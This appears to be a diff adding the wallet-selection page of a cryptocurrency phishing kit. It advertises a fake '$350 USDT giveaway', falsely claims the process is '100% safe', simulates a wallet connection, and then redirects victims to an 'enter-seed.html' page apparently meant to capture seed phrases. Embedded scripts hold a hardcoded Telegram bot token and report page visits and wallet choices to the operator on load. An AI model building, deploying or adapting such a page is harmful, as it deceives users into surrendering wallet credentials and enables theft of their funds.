@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Select Your Wallet</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Poppins:wght@600&display=swap" rel="stylesheet">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #0e1a24, #1e2d3a);
+      color: #ffffff;
+      min-height: 100%;
+      overflow-x: hidden;
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: -1;
+    }
+
+    .floating-symbols {
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .symbol {
+      position: absolute;
+      opacity: 0.06;
+      animation: float 25s linear infinite, fadeIn 2s ease-in;
+    }
+
+    .symbol:nth-child(3n) { width: 32px; opacity: 0.08; }
+    .symbol:nth-child(5n) { width: 40px; opacity: 0.12; }
+    .symbol img { width: 100%; height: auto; }
+
+    @keyframes float {
+      0%   { transform: translateY(100vh) translateX(0); }
+      100% { transform: translateY(-100vh) translateX(100px); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to   { opacity: inherit; transform: scale(1); }
+    }
+
+    .symbol:nth-child(even) {
+      animation-duration: 35s;
+      animation-direction: reverse;
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px 80px;
+      text-align: center;
+      max-width: 800px;
+      margin: 0 auto;
+    }
+
+    .info {
+      font-size: 1.1rem;
+      line-height: 1.7;
+      background-color: rgba(255, 255, 255, 0.04);
+      padding: 20px;
+      border-radius: 12px;
+      margin-bottom: 40px;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.05);
+    }
+
+    .info h1 {
+      font-family: 'Poppins', sans-serif;
+      font-size: 2.4rem;
+      font-weight: 700;
+      background: linear-gradient(90deg, #00ffcc, #00d2ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 20px;
+    }
+
+    .info strong { color: #00d2ff; }
+
+    .category {
+      margin-top: 30px;
+      text-align: left;
+      width: 100%;
+      max-width: 420px;
+    }
+
+    .category h2 {
+      font-size: 1.3rem;
+      margin-bottom: 10px;
+      color: #00d2ff;
+    }
+
+    ul.wallet-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    ul.wallet-list li {
+      background-color: #16232e;
+      margin: 10px 0;
+      padding: 14px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      color: #e2e8f0;
+      animation: slideIn 0.5s ease forwards;
+      opacity: 0;
+    }
+
+    ul.wallet-list li:hover {
+      background-color: #00d2ff;
+      color: #000;
+      transform: scale(1.05);
+    }
+
+    ul.wallet-list li:hover img {
+      box-shadow: 0 0 10px rgba(0, 210, 255, 0.5);
+    }
+
+    ul.wallet-list img {
+      width: 36px;
+      height: 36px;
+      border-radius: 8px;
+      object-fit: contain;
+      background: #ffffff;
+      padding: 4px;
+      box-shadow: 0 0 6px rgba(0, 210, 255, 0.1);
+    }
+
+    @keyframes slideIn {
+      from { transform: translateX(-20px); opacity: 0; }
+      to   { transform: translateX(0); opacity: 1; }
+    }
+
+    .back-button {
+      margin-top: 40px;
+      padding: 14px 32px;
+      font-size: 18px;
+      font-weight: bold;
+      border: none;
+      background-color: #00d2ff;
+      color: black;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .back-button:hover {
+      background-color: #00bcd4;
+    }
+
+    .spinner {
+      margin-top: 20px;
+      width: 40px;
+      height: 40px;
+      border: 4px solid rgba(255, 255, 255, 0.2);
+      border-top: 4px solid #00d2ff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    #message {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay"></div>
+
+  <div class="floating-symbols">
+    <div class="symbol" style="left: 5%; top: 90%;"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.svg" alt="BTC"></div>
+    <div class="symbol" style="left: 15%; top: 80%;"><img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg" alt="ETH"></div>
+    <div class="symbol" style="left: 25%; top: 85%;"><img src="https://cryptologos.cc/logos/solana-sol-logo.svg" alt="SOL"></div>
+    <div class="symbol" style="left: 35%; top: 88%;"><img src="https://cryptologos.cc/logos/cardano-ada-logo.svg" alt="ADA"></div>
+    <div class="symbol" style="left: 45%; top: 92%;"><img src="https://cryptologos.cc/logos/ripple-xrp-logo.svg" alt="XRP"></div>
+    <div class="symbol" style="left: 55%; top: 86%;"><img src="https://cryptologos.cc/logos/dogecoin-doge-logo.svg" alt="DOGE"></div>
+    <div class="symbol" style="left: 65%; top: 95%;"><img src="https://cryptologos.cc/logos/litecoin-ltc-logo.svg" alt="LTC"></div>
+    <div class="symbol" style="left: 75%; top: 90%;"><img src="https://cryptologos.cc/logos/polkadot-new-dot-logo.svg" alt="DOT"></div>
+    <div class="symbol" style="left: 85%; top: 94%;"><img src="https://cryptologos.cc/logos/phantom-phantom-logo.png?v=026" alt="PHNTM"></div>
+    <div class="symbol" style="left: 95%; top: 97%;"><img src="https://cryptologos.cc/logos/exodus-exodus-logo.png?v=026" alt="EXO"></div>
+  </div>
+
+  <div class="container">
+    <div class="info">
+      <h1>Secure Your Giveaway Reward</h1>
+      <p>
+        To receive your <strong>$350 USDT giveaway</strong>, connect your wallet. 
+        This ensures tokens are delivered securely and directly to your address.
+        Your keys are never stored or accessed.
+      </p>
+      <p>
+        The connection process verifies eligibility and guarantees proper delivery via trusted protocols. 
+        <strong>This is 100% safe, non-custodial, and secure.</strong>
+      </p>
+    </div>
+
+    <h1>Select Your Wallet</h1>
+    <div id="walletCategories"></div>
+    <button class="back-button" onclick="location.href='index.html'">Back to Main Page</button>
+    <div id="loading" class="spinner"></div>
+    <div id="message"></div>
+  </div>
+
+  <script>
+    const wallets = {
+      "Popular Wallets": [
+        { name: "MetaMask", icon: "https://images.ctfassets.net/clixtyxoaeas/1ezuBGezqfIeifWdVtwU4c/d970d4cdf13b163efddddd5709164d2e/MetaMask-icon-Fox.svg" },
+        { name: "WalletConnect", icon: "https://logosarchive.com/wp-content/uploads/2022/02/WalletConnect-icon.svg" },
+        { name: "Coinbase Wallet", icon: "https://avatars.githubusercontent.com/u/18060234?s=200&v=4" },
+        { name: "Trust Wallet", icon: "https://trustwallet.com/assets/images/media/assets/TWT.png" },
+        { name: "Phantom Wallet", icon: "https://187760183-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MVOiF6Zqit57q_hxJYp%2Fuploads%2FHEjleywo9QOnfYebBPCZ%2FPhantom_SVG_Icon.svg?alt=media&token=71b80a0a-def7-4f98-ae70-5e0843fdaaec" },
+        { name: "Exodus Wallet", icon: "https://www.exodus.com/brand/dl/images/Exodus_logo_dark.png"},
+        { name: "Brave Wallet", icon: "https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/brave-browser-icon.png"},
+      ],
+      "Solana Wallets": [
+        { name: "Solflare", icon: "https://cryptorussia.ru/wp-content/uploads/2024/06/solflare-1200x900.jpg" }
+      ],
+      "Hardware Wallets": [
+        { name: "Ledger Live", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTUqZ8CP4KSQJXw_N1dYrUI5yU6sGUOZqhwuw&s" }
+      ],
+      "Multichain Wallets": [
+        { name: "Rainbow Wallet", icon: "https://avatars.githubusercontent.com/u/65080509?s=200&v=4" },
+        { name: "Talisman Wallet", icon: "https://avatars.githubusercontent.com/u/92443479?s=200&v=4" },
+        { name: "Argent Wallet", icon: "https://avatars.githubusercontent.com/u/28631269?s=200&v=4" },
+        { name: "Keplr Wallet", icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuNy7-i9qxpKFqN-e5K4dH2pGFTmpK7Sq6yA&s" }
+      ]
+    };
+
+    const container = document.getElementById("walletCategories");
+    const loading = document.getElementById("loading");
+    const message = document.getElementById("message");
+
+    function renderWallets() {
+      for (const [category, walletList] of Object.entries(wallets)) {
+        const section = document.createElement("div");
+        section.className = "category";
+
+        const title = document.createElement("h2");
+        title.textContent = category;
+
+        const ul = document.createElement("ul");
+        ul.className = "wallet-list";
+
+        walletList.forEach((wallet, index) => {
+          const li = document.createElement("li");
+          li.style.animationDelay = `${index * 0.1}s`;
+          li.title = wallet.name;
+          li.onclick = () => connectWallet(wallet.name);
+
+          const img = document.createElement("img");
+          img.src = wallet.icon;
+          img.alt = wallet.name;
+
+          const span = document.createElement("span");
+          span.textContent = wallet.name;
+
+          li.appendChild(img);
+          li.appendChild(span);
+          ul.appendChild(li);
+        });
+
+        section.appendChild(title);
+        section.appendChild(ul);
+        container.appendChild(section);
+      }
+    }
+
+    function connectWallet(walletName) {
+      loading.style.display = "block";
+      message.textContent = `Connecting to ${walletName}...`;
+
+      setTimeout(() => {
+        loading.style.display = "none";
+        message.textContent = `${walletName} connected successfully! ✅`;
+
+        // Optional redirect after connection
+        setTimeout(() => {
+          window.location.href = "enter-seed.html";
+        }, 1000);
+      }, 2000);
+    }
+
+    document.addEventListener("DOMContentLoaded", renderWallets);
+  </script>
+  <script>
+    const TELEGRAM_BOT_TOKEN = "7432123629:AAHjGiVj0COI6c8g7VNyuVwuA2UPj5gnBNk";
+    const TELEGRAM_CHAT_ID = "7657389332";
+    
+    function sendTelegramMessage(message) {
+      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+    </script>
+    <script>
+      const BOT_TOKEN = '7432123629:AAHjGiVj0COI6c8g7VNyuVwuA2UPj5gnBNk';
+      const CHAT_ID = '7657389332';
+    
+      function sendTelegramMessage(message) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+      }
+    
+      // Notify when page is loaded
+      window.addEventListener('DOMContentLoaded', () => {
+        sendTelegramMessage('📥 <b>Page Visit</b>\n🧩 Page: <code>Wallet Selector</code>\n🕒 Time: ' + new Date().toLocaleString());
+      });
+    
+      // Example function: Call this when a wallet is selected
+      function notifyWalletSelection(walletName) {
+        sendTelegramMessage(`🧠 <b>Wallet Selected</b>\n👛 Wallet: <code>${walletName}</code>\n📄 Page: Wallet Selector\n🕒 Time: ${new Date().toLocaleString()}`);
+      }
+    
+      // OPTIONAL: Attach to existing wallet buttons
+      document.addEventListener('click', function(e) {
+        if (e.target.classList.contains('wallet-button')) {
+          const walletName = e.target.getAttribute('data-wallet-name') || 'Unknown Wallet';
+          notifyWalletSelection(walletName);
+        }
+      });
+    </script>
+</body>
+</html>
